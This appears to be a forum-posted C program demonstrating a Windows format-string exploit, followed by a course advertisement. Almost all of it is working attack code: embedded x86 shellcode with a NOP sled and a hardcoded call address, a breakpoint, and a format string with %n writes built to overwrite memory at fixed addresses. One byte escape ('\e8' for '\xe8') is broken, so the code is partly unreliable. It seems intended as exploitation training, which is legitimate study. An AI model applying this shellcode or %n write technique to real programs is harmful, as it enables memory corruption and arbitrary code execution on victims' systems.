
```c
#include<stdio.h>  

#include<stdlib.h>  

#include<string.h>  

  

static char buffer1[256];  
static char buffer2[256];  
static char buffer3[256];  
static char buffer4[256];  
static unsigned int write_byte;  
static unsigned int already_written,width_field;  

int main()  
{  
    char format[1024]={0};  
    _asm int 3  

    unsigned char exploit[64]=  
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"  
    "\x33\xDB\x53\x68\x62\x75\x70\x74\x68\x62\x75\x70\x74\x8B\xC4\x53"  
    "\x50\x50\x53\xB8\x68\x3D\xE2\x77\xFF\xD0\x90\x90\x90\x90\x90\x90";  

    int size_buffer1;  
    int size_buffer2;  
    int size_buffer3;  
    int size_buffer4;  

    memcpy(format,"\xaa\xaa\xaa\xaa",4);  
    memcpy(format+4,"\x2b\x61\e8\x77",4);  
    memcpy(format+8,"\xaa\xaa\xaa\xaa",4);  
    memcpy(format+12,"\x2c\x61\xe8\x77",4);  
    memcpy(format+16,"\xaa\xaa\xaa\xaa",4);  
    memcpy(format+20,"\x2d\x61\xe8\x77",4);  
    memcpy(format+24,"\xaa\xaa\xaa\xaa",4);  
    memcpy(format+28,"\x2e\x61\xe8\x77",4);  

    memcpy(format+32,"%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x",80);  

    already_written=112;  

    write_byte=0x50;  
    already_written%=0x100;  
    width_field=(write_byte-already_written)%0x100;  
    if(width_field<10)  
        width_field+=0x100;  
    sprintf(buffer1,"%%%du%%n",width_field);  
    size_buffer1=strlen(buffer1);  
    memcpy(format+112,buffer1,size_buffer1);  

    write_byte=0x20;  
    already_written+=width_field;  
    already_written%=0x100;  
    width_field=(write_byte-already_written)%0x100;  
    if(width_field<10)  
        width_field+=0x100;  
    sprintf(buffer2,"%%%du%%n",width_field);  
    size_buffer2=strlen(buffer2);  
    memcpy(format+112+size_buffer1,buffer2,size_buffer2);  

    write_byte=0x42;  
    already_written+=width_field;  
    already_written%=0x100;  
    width_field=(write_byte-already_written)%0x100;  
    if(width_field<10)  
        width_field+=0x100;  
    sprintf(buffer3,"%%%du%%n",width_field);  
    size_buffer3=strlen(buffer3);  
    memcpy(format+112+size_buffer1+size_buffer2,buffer3,size_buffer3);  

    write_byte=0x00;  
    already_written+=width_field;  
    already_written%=0x100;  
    width_field=(write_byte-already_written)%0x100;  
    if(width_field<10)  
        width_field+=0x100;  
    sprintf(buffer4,"%%%du%%n",width_field);  
    size_buffer4=strlen(buffer4);  
    memcpy(format+112+size_buffer1+size_buffer2+size_buffer3,buffer4,size_buffer4);  

    printf(format,1);  
    return 0;  
}
```

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)

最后于 2019-2-27 10:27

被houjingyi编辑，原因：重新上传图片
